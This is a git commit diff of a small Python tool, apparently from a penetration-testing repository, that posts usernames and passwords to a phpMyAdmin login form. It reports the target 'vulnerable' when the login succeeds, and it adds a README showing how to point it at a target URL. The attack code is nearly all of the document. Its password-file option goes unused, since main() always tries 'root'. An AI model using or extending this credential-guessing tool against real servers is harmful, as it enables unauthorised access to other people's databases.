c4a9a992a182fee7a9717ebc99e7be18e84e5564
sqlsec <1960015980@qq.com>
2018-06-29 11:43:08 +0800

    Add function ：usage and basic function (in master)

--- 0-PenetrationTesting/CreakPHPMyAdmin/CrackPHPMyAdmin.py
+++ 0-PenetrationTesting/CreakPHPMyAdmin/CrackPHPMyAdmin.py
@@ -1,51 +1,45 @@
-import optparse
 import re
-from bs4 import BeautifulSoup
 import requests
+import optparse
+from colorama import Fore,Back,Style
+
+def req(url,username,password):
+    headers =  {
+        'Content-Type':'application/x-www-form-urlencoded',
+        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    }
+    payload = {
+        'pma_username':'{}'.format(username),
+        'pma_password':'{}'.format(password),
+        'server':'1',
+    }
+    res = requests.post(url,data=payload,headers=headers)
+    return res
 
 def option():
     usage = '%prog -h | --help'
-
     parser = optparse.OptionParser(usage = usage)
-    parser.add_option("-u",dest="url",help="target url  usage: -u http://www.xxx.com/phpmyadmin")
-    parser.add_option("-d",dest="dict",help="dict path   usage: -d /xxx/xxx/password.txt")
+    parser.add_option("--url",dest="url",help="target url  usage: -url http://www.xxx.com/phpmyadmin")
+    parser.add_option("--user",dest="username",help="username   usage: --user root")
+    parser.add_option("--pass",dest="password",help="password path   usage: --pass /sqlsec/password.txt")
     (options, args) = parser.parse_args()
+    return parser,options
 
-    url_pattern = re.compile(r'^https?:/{2}\w.+$')
-    url = url_pattern.match(options.url)
-
-    if url:
-        print (options.url)
-    else:
-        parser.print_help()
-        print("Please check your input format")
-
-def Crack():
-    rs = requests.session()
-    url = "{target_url}".format(url=url)
-
-    r = rs.get(url)
-    headers = {'Content-Type':'application/x-www-form-urlencoded',
-            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
-            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-            }
-    soup=BeautifulSoup(r.text,'html.parser')
-    rev = soup.find_all("form")[1]
-    rev_session = rev.find_all("input")[0].attrs['value']
-    rev_token = rev.find_all("input")[-1].attrs['value']
-    payload = {
-        'set_session':'rev_session',
-        'pma_username':'root',
-        'pma_password':'root',
-        'server':'1',
-        'token':'rev_token'
-    }
-
-    res = rs.post(url, data=payload, headers=headers)
-    print(res.text)
-    
 def main():
-    option()
+    parser,args = option()
+    try:
+        res = req(args.url,args.username,'root')
+        login_success = re.compile(r'opendb_url')
+        success = login_success.search(res.text)
+
+        if success:
+            print(Fore.GREEN + "[+] PHPMyAdmin is vulerable")
+        else:
+            print(Fore.RED + "[*] PHPMyAdmin is not vulerable")
+    except Exception as e:
+        print(Fore.YELLOW + '执行异常{}'.format(e))
+        parser.print_help()
 
 if __name__ == '__main__':
     main()
---
+++ 0-PenetrationTesting/CreakPHPMyAdmin/README.md
@@ -0,0 +1,15 @@
+# install requirements
+```shell
+pip3 install -r requirements.txt
+```
+
+# usage
+```r
+Usage: creakmysql.py -h | --help
+
+Options:
+  -h, --help       show this help message and exit
+  --url=URL        target url  usage: -url http://www.xxx.com/phpmyadmin
+  --user=USERNAME  username   usage: --user root
+  --pass=PASSWORD  password path   usage: --pass /sqlsec/password.txt
+```
